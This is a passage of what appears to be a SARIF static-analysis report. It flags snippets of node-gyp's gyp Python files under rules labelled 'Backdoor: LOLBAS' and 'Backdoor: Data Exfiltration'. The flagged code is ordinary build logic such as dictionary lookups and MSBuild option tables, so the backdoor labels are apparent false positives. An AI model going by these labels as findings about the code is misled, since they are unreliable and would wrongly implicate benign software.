                    "text": "                node = [\"Filter\", {\"Name\": f.name}]\n                self._AddFilesToNode(node, f.contents)\n            else:\n                node = [\"File\", {\"RelativePath\": f}]\n                self.files_dict[f] = node\n            parent.append(node)\n\n",
                    "rendered": {
                      "text": "                node = [\"Filter\", {\"Name\": f.name}]\n                self._AddFilesToNode(node, f.contents)\n            else:\n                node = [\"File\", {\"RelativePath\": f}]\n                self.files_dict[f] = node\n            parent.append(node)\n\n",
                      "markdown": "`                node = [\"Filter\", {\"Name\": f.name}]\n                self._AddFilesToNode(node, f.contents)\n            else:\n                node = [\"File\", {\"RelativePath\": f}]\n                self.files_dict[f] = node\n            parent.append(node)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSProject.py"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 15,
                  "endLine": 144,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    \"\"\"\n        for f in files:\n            if isinstance(f, Filter):\n                node = [\"Filter\", {\"Name\": f.name}]\n                self._AddFilesToNode(node, f.contents)\n            else:\n                node = [\"File\", {\"RelativePath\": f}]\n",
                    "rendered": {
                      "text": "    \"\"\"\n        for f in files:\n            if isinstance(f, Filter):\n                node = [\"Filter\", {\"Name\": f.name}]\n                self._AddFilesToNode(node, f.contents)\n            else:\n                node = [\"File\", {\"RelativePath\": f}]\n",
                      "markdown": "`    \"\"\"\n        for f in files:\n            if isinstance(f, Filter):\n                node = [\"Filter\", {\"Name\": f.name}]\n                self._AddFilesToNode(node, f.contents)\n            else:\n                node = [\"File\", {\"RelativePath\": f}]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSProject.py"
                },
                "region": {
                  "startLine": 137,
                  "startColumn": 25,
                  "endLine": 138,
                  "snippet": {
                    "text": "        \"\"\"Adds files and/or filters to the parent node.\n\n    Args:\n      parent: Destination node\n      files: A list of Filter objects and/or relative paths to files.\n\n    Will call itself recursively, if the files list contains Filter objects.\n    \"\"\"\n",
                    "rendered": {
                      "text": "        \"\"\"Adds files and/or filters to the parent node.\n\n    Args:\n      parent: Destination node\n      files: A list of Filter objects and/or relative paths to files.\n\n    Will call itself recursively, if the files list contains Filter objects.\n    \"\"\"\n",
                      "markdown": "`        \"\"\"Adds files and/or filters to the parent node.\n\n    Args:\n      parent: Destination node\n      files: A list of Filter objects and/or relative paths to files.\n\n    Will call itself recursively, if the files list contains Filter objects.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSProject.py"
                },
                "region": {
                  "startLine": 108,
                  "startColumn": 27,
                  "endLine": 108,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        if not tools:\n            tools = []\n\n        # Add configuration node and its attributes\n        node_attrs = attrs.copy()\n        node_attrs[\"Name\"] = config_name\n        specification = [config_type, node_attrs]\n",
                    "rendered": {
                      "text": "        if not tools:\n            tools = []\n\n        # Add configuration node and its attributes\n        node_attrs = attrs.copy()\n        node_attrs[\"Name\"] = config_name\n        specification = [config_type, node_attrs]\n",
                      "markdown": "`        if not tools:\n            tools = []\n\n        # Add configuration node and its attributes\n        node_attrs = attrs.copy()\n        node_attrs[\"Name\"] = config_name\n        specification = [config_type, node_attrs]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSProject.py"
                },
                "region": {
                  "startLine": 178,
                  "startColumn": 32,
                  "endLine": 178,
                  "endColumn": 37,
                  "snippet": {
                    "text": "      ValueError: Relative path does not match any file added via AddFiles().\n    \"\"\"\n        # Find the file node with the right relative path\n        parent = self.files_dict.get(path)\n        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n\n",
                    "rendered": {
                      "text": "      ValueError: Relative path does not match any file added via AddFiles().\n    \"\"\"\n        # Find the file node with the right relative path\n        parent = self.files_dict.get(path)\n        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n\n",
                      "markdown": "`      ValueError: Relative path does not match any file added via AddFiles().\n    \"\"\"\n        # Find the file node with the right relative path\n        parent = self.files_dict.get(path)\n        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 268,
                  "startColumn": 9,
                  "endLine": 268,
                  "endColumn": 17,
                  "snippet": {
                    "text": "        target_dicts[full_copy_target_name] = copy_dict\n        target_dicts[full_shim_target_name] = shim_dict\n\n        # Update the original target to depend on the shim target.\n        target_dict.setdefault(\"dependencies\", []).append(full_shim_target_name)\n\n    return (target_list, target_dicts)\n",
                    "rendered": {
                      "text": "        target_dicts[full_copy_target_name] = copy_dict\n        target_dicts[full_shim_target_name] = shim_dict\n\n        # Update the original target to depend on the shim target.\n        target_dict.setdefault(\"dependencies\", []).append(full_shim_target_name)\n\n    return (target_list, target_dicts)\n",
                      "markdown": "`        target_dicts[full_copy_target_name] = copy_dict\n        target_dicts[full_shim_target_name] = shim_dict\n\n        # Update the original target to depend on the shim target.\n        target_dict.setdefault(\"dependencies\", []).append(full_shim_target_name)\n\n    return (target_list, target_dicts)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 248,
                  "startColumn": 13,
                  "endLine": 248,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n            msvs = config.setdefault(\"msvs_settings\", {})\n\n            # Update the compiler directives in the shim target.\n            compiler = msvs.setdefault(\"VCCLCompilerTool\", {})\n            compiler[\"DebugInformationFormat\"] = \"3\"\n            compiler[\"ProgramDataBaseFileName\"] = pdb_path\n",
                    "rendered": {
                      "text": "\n            msvs = config.setdefault(\"msvs_settings\", {})\n\n            # Update the compiler directives in the shim target.\n            compiler = msvs.setdefault(\"VCCLCompilerTool\", {})\n            compiler[\"DebugInformationFormat\"] = \"3\"\n            compiler[\"ProgramDataBaseFileName\"] = pdb_path\n",
                      "markdown": "`\n            msvs = config.setdefault(\"msvs_settings\", {})\n\n            # Update the compiler directives in the shim target.\n            compiler = msvs.setdefault(\"VCCLCompilerTool\", {})\n            compiler[\"DebugInformationFormat\"] = \"3\"\n            compiler[\"ProgramDataBaseFileName\"] = pdb_path\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 239,
                  "startColumn": 44,
                  "endLine": 239,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\n        # Set up the shim to output its PDB to the same location as the final linker\n        # target.\n        for config_name, config in shim_dict.get(\"configurations\").items():\n            pdb_path = _GetPdbPath(target_dict, config_name, vars)\n\n            # A few keys that we don't want to propagate.\n",
                    "rendered": {
                      "text": "\n        # Set up the shim to output its PDB to the same location as the final linker\n        # target.\n        for config_name, config in shim_dict.get(\"configurations\").items():\n            pdb_path = _GetPdbPath(target_dict, config_name, vars)\n\n            # A few keys that we don't want to propagate.\n",
                      "markdown": "`\n        # Set up the shim to output its PDB to the same location as the final linker\n        # target.\n        for config_name, config in shim_dict.get(\"configurations\").items():\n            pdb_path = _GetPdbPath(target_dict, config_name, vars)\n\n            # A few keys that we don't want to propagate.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 200,
                  "startColumn": 33,
                  "endLine": 200,
                  "endColumn": 38,
                  "snippet": {
                    "text": "\n    for t in targets_to_shim:\n        target_dict = target_dicts[t]\n        target_name = target_dict.get(\"target_name\")\n\n        base_dict = _DeepCopySomeKeys(\n            target_dict, [\"configurations\", \"default_configuration\", \"toolset\"]\n",
                    "rendered": {
                      "text": "\n    for t in targets_to_shim:\n        target_dict = target_dicts[t]\n        target_name = target_dict.get(\"target_name\")\n\n        base_dict = _DeepCopySomeKeys(\n            target_dict, [\"configurations\", \"default_configuration\", \"toolset\"]\n",
                      "markdown": "`\n    for t in targets_to_shim:\n        target_dict = target_dicts[t]\n        target_name = target_dict.get(\"target_name\")\n\n        base_dict = _DeepCopySomeKeys(\n            target_dict, [\"configurations\", \"default_configuration\", \"toolset\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 188,
                  "startColumn": 30,
                  "endLine": 188,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        target_dict = target_dicts[t]\n\n        # We only want to shim targets that have msvs_large_pdb enabled.\n        if not int(target_dict.get(\"msvs_large_pdb\", 0)):\n            continue\n        # This is intended for executable, shared_library and loadable_module\n        # targets where every configuration is set up to produce a PDB output.\n",
                    "rendered": {
                      "text": "        target_dict = target_dicts[t]\n\n        # We only want to shim targets that have msvs_large_pdb enabled.\n        if not int(target_dict.get(\"msvs_large_pdb\", 0)):\n            continue\n        # This is intended for executable, shared_library and loadable_module\n        # targets where every configuration is set up to produce a PDB output.\n",
                      "markdown": "`        target_dict = target_dicts[t]\n\n        # We only want to shim targets that have msvs_large_pdb enabled.\n        if not int(target_dict.get(\"msvs_large_pdb\", 0)):\n            continue\n        # This is intended for executable, shared_library and loadable_module\n        # targets where every configuration is set up to produce a PDB output.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 162,
                  "startColumn": 26,
                  "endLine": 162,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    if pdb_path:\n        return pdb_path\n\n    pdb_base = target_dict.get(\"product_name\", target_dict[\"target_name\"])\n    pdb_base = \"{}.{}.pdb\".format(pdb_base, TARGET_TYPE_EXT[target_dict[\"type\"]])\n    pdb_path = vars[\"PRODUCT_DIR\"] + \"/\" + pdb_base\n\n",
                    "rendered": {
                      "text": "    if pdb_path:\n        return pdb_path\n\n    pdb_base = target_dict.get(\"product_name\", target_dict[\"target_name\"])\n    pdb_base = \"{}.{}.pdb\".format(pdb_base, TARGET_TYPE_EXT[target_dict[\"type\"]])\n    pdb_path = vars[\"PRODUCT_DIR\"] + \"/\" + pdb_base\n\n",
                      "markdown": "`    if pdb_path:\n        return pdb_path\n\n    pdb_base = target_dict.get(\"product_name\", target_dict[\"target_name\"])\n    pdb_base = \"{}.{}.pdb\".format(pdb_base, TARGET_TYPE_EXT[target_dict[\"type\"]])\n    pdb_path = vars[\"PRODUCT_DIR\"] + \"/\" + pdb_base\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 158,
                  "startColumn": 24,
                  "endLine": 158,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        return pdb_path\n\n    variables = target_dict.get(\"variables\", {})\n    pdb_path = variables.get(\"msvs_large_pdb_path\", None)\n    if pdb_path:\n        return pdb_path\n\n",
                    "rendered": {
                      "text": "        return pdb_path\n\n    variables = target_dict.get(\"variables\", {})\n    pdb_path = variables.get(\"msvs_large_pdb_path\", None)\n    if pdb_path:\n        return pdb_path\n\n",
                      "markdown": "`        return pdb_path\n\n    variables = target_dict.get(\"variables\", {})\n    pdb_path = variables.get(\"msvs_large_pdb_path\", None)\n    if pdb_path:\n        return pdb_path\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 157,
                  "startColumn": 27,
                  "endLine": 157,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    if pdb_path:\n        return pdb_path\n\n    variables = target_dict.get(\"variables\", {})\n    pdb_path = variables.get(\"msvs_large_pdb_path\", None)\n    if pdb_path:\n        return pdb_path\n",
                    "rendered": {
                      "text": "    if pdb_path:\n        return pdb_path\n\n    variables = target_dict.get(\"variables\", {})\n    pdb_path = variables.get(\"msvs_large_pdb_path\", None)\n    if pdb_path:\n        return pdb_path\n",
                      "markdown": "`    if pdb_path:\n        return pdb_path\n\n    variables = target_dict.get(\"variables\", {})\n    pdb_path = variables.get(\"msvs_large_pdb_path\", None)\n    if pdb_path:\n        return pdb_path\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 153,
                  "startColumn": 21,
                  "endLine": 153,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n    linker = msvs.get(\"VCLinkerTool\", {})\n\n    pdb_path = linker.get(\"ProgramDatabaseFile\")\n    if pdb_path:\n        return pdb_path\n\n",
                    "rendered": {
                      "text": "\n    linker = msvs.get(\"VCLinkerTool\", {})\n\n    pdb_path = linker.get(\"ProgramDatabaseFile\")\n    if pdb_path:\n        return pdb_path\n\n",
                      "markdown": "`\n    linker = msvs.get(\"VCLinkerTool\", {})\n\n    pdb_path = linker.get(\"ProgramDatabaseFile\")\n    if pdb_path:\n        return pdb_path\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 151,
                  "startColumn": 17,
                  "endLine": 151,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    config = target_dict[\"configurations\"][config_name]\n    msvs = config.setdefault(\"msvs_settings\", {})\n\n    linker = msvs.get(\"VCLinkerTool\", {})\n\n    pdb_path = linker.get(\"ProgramDatabaseFile\")\n    if pdb_path:\n",
                    "rendered": {
                      "text": "    config = target_dict[\"configurations\"][config_name]\n    msvs = config.setdefault(\"msvs_settings\", {})\n\n    linker = msvs.get(\"VCLinkerTool\", {})\n\n    pdb_path = linker.get(\"ProgramDatabaseFile\")\n    if pdb_path:\n",
                      "markdown": "`    config = target_dict[\"configurations\"][config_name]\n    msvs = config.setdefault(\"msvs_settings\", {})\n\n    linker = msvs.get(\"VCLinkerTool\", {})\n\n    pdb_path = linker.get(\"ProgramDatabaseFile\")\n    if pdb_path:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 117,
                  "startColumn": 56,
                  "endLine": 117,
                  "endColumn": 61,
                  "snippet": {
                    "text": "    # Shard dependencies.\n    for t in sorted(new_target_dicts):\n        for deptype in (\"dependencies\", \"dependencies_original\"):\n            dependencies = copy.copy(new_target_dicts[t].get(deptype, []))\n            new_dependencies = []\n            for d in dependencies:\n                if d in targets_to_shard:\n",
                    "rendered": {
                      "text": "    # Shard dependencies.\n    for t in sorted(new_target_dicts):\n        for deptype in (\"dependencies\", \"dependencies_original\"):\n            dependencies = copy.copy(new_target_dicts[t].get(deptype, []))\n            new_dependencies = []\n            for d in dependencies:\n                if d in targets_to_shard:\n",
                      "markdown": "`    # Shard dependencies.\n    for t in sorted(new_target_dicts):\n        for deptype in (\"dependencies\", \"dependencies_original\"):\n            dependencies = copy.copy(new_target_dicts[t].get(deptype, []))\n            new_dependencies = []\n            for d in dependencies:\n                if d in targets_to_shard:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 48,
                  "endLine": 107,
                  "endColumn": 53,
                  "snippet": {
                    "text": "                new_target_dicts[name][\"target_name\"] = _ShardName(\n                    new_target_dicts[name][\"target_name\"], i\n                )\n                sources = new_target_dicts[name].get(\"sources\", [])\n                new_sources = []\n                for pos in range(i, len(sources), targets_to_shard[t]):\n                    new_sources.append(sources[pos])\n",
                    "rendered": {
                      "text": "                new_target_dicts[name][\"target_name\"] = _ShardName(\n                    new_target_dicts[name][\"target_name\"], i\n                )\n                sources = new_target_dicts[name].get(\"sources\", [])\n                new_sources = []\n                for pos in range(i, len(sources), targets_to_shard[t]):\n                    new_sources.append(sources[pos])\n",
                      "markdown": "`                new_target_dicts[name][\"target_name\"] = _ShardName(\n                    new_target_dicts[name][\"target_name\"], i\n                )\n                sources = new_target_dicts[name].get(\"sources\", [])\n                new_sources = []\n                for pos in range(i, len(sources), targets_to_shard[t]):\n                    new_sources.append(sources[pos])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSUtil.py"
                },
                "region": {
                  "startLine": 86,
                  "startColumn": 36,
                  "endLine": 86,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    # Gather the targets to shard, and how many pieces.\n    targets_to_shard = {}\n    for t in target_dicts:\n        shards = int(target_dicts[t].get(\"msvs_shard\", 0))\n        if shards:\n            targets_to_shard[t] = shards\n    # Shard target_list.\n",
                    "rendered": {
                      "text": "    # Gather the targets to shard, and how many pieces.\n    targets_to_shard = {}\n    for t in target_dicts:\n        shards = int(target_dicts[t].get(\"msvs_shard\", 0))\n        if shards:\n            targets_to_shard[t] = shards\n    # Shard target_list.\n",
                      "markdown": "`    # Gather the targets to shard, and how many pieces.\n    targets_to_shard = {}\n    for t in target_dicts:\n        shards = int(target_dicts[t].get(\"msvs_shard\", 0))\n        if shards:\n            targets_to_shard[t] = shards\n    # Shard target_list.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 1269,
                  "startColumn": 1,
                  "endLine": 1269,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\n# Directives for MASM.\n# See \"$(VCTargetsPath)\\BuildCustomizations\\masm.xml\" for the schema of the\n# MSBuild MASM settings.\n\n# Options that have the same name in MSVS and MSBuild.\n_Same(_masm, \"UseSafeExceptionHandlers\", _boolean)  # /safeseh\n",
                    "rendered": {
                      "text": "\n# Directives for MASM.\n# See \"$(VCTargetsPath)\\BuildCustomizations\\masm.xml\" for the schema of the\n# MSBuild MASM settings.\n\n# Options that have the same name in MSVS and MSBuild.\n_Same(_masm, \"UseSafeExceptionHandlers\", _boolean)  # /safeseh\n",
                      "markdown": "`\n# Directives for MASM.\n# See \"$(VCTargetsPath)\\BuildCustomizations\\masm.xml\" for the schema of the\n# MSBuild MASM settings.\n\n# Options that have the same name in MSVS and MSBuild.\n_Same(_masm, \"UseSafeExceptionHandlers\", _boolean)  # /safeseh\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 1256,
                  "startColumn": 1,
                  "endLine": 1256,
                  "endColumn": 10,
                  "snippet": {
                    "text": "_MSVSOnly(_manifest, \"UseFAT32Workaround\", _boolean)\n_MSVSOnly(_manifest, \"UseUnicodeResponseFiles\", _boolean)\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_manifest, \"EnableDPIAwareness\", _boolean)\n_MSBuildOnly(_manifest, \"GenerateCategoryTags\", _boolean)  # /category\n_MSBuildOnly(\n",
                    "rendered": {
                      "text": "_MSVSOnly(_manifest, \"UseFAT32Workaround\", _boolean)\n_MSVSOnly(_manifest, \"UseUnicodeResponseFiles\", _boolean)\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_manifest, \"EnableDPIAwareness\", _boolean)\n_MSBuildOnly(_manifest, \"GenerateCategoryTags\", _boolean)  # /category\n_MSBuildOnly(\n",
                      "markdown": "`_MSVSOnly(_manifest, \"UseFAT32Workaround\", _boolean)\n_MSVSOnly(_manifest, \"UseUnicodeResponseFiles\", _boolean)\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_manifest, \"EnableDPIAwareness\", _boolean)\n_MSBuildOnly(_manifest, \"GenerateCategoryTags\", _boolean)  # /category\n_MSBuildOnly(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 1225,
                  "startColumn": 45,
                  "endLine": 1226,
                  "snippet": {
                    "text": "# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\mt.xml\" for\n# the schema of the MSBuild Lib settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_manifest, \"AdditionalManifestFiles\", _file_list)  # /manifest\n_Same(_manifest, \"AdditionalOptions\", _string_list)\n_Same(_manifest, \"AssemblyIdentity\", _string)  # /identity:\n_Same(_manifest, \"ComponentFileName\", _file_name)  # /dll\n",
                    "rendered": {
                      "text": "# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\mt.xml\" for\n# the schema of the MSBuild Lib settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_manifest, \"AdditionalManifestFiles\", _file_list)  # /manifest\n_Same(_manifest, \"AdditionalOptions\", _string_list)\n_Same(_manifest, \"AssemblyIdentity\", _string)  # /identity:\n_Same(_manifest, \"ComponentFileName\", _file_name)  # /dll\n",
                      "markdown": "`# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\mt.xml\" for\n# the schema of the MSBuild Lib settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_manifest, \"AdditionalManifestFiles\", _file_list)  # /manifest\n_Same(_manifest, \"AdditionalOptions\", _string_list)\n_Same(_manifest, \"AssemblyIdentity\", _string)  # /identity:\n_Same(_manifest, \"ComponentFileName\", _file_name)  # /dll\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 1223,
                  "startColumn": 19,
                  "endLine": 1223,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n# Directives for converting VCManifestTool to Mt.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\mt.xml\" for\n# the schema of the MSBuild Lib settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_manifest, \"AdditionalManifestFiles\", _file_list)  # /manifest\n",
                    "rendered": {
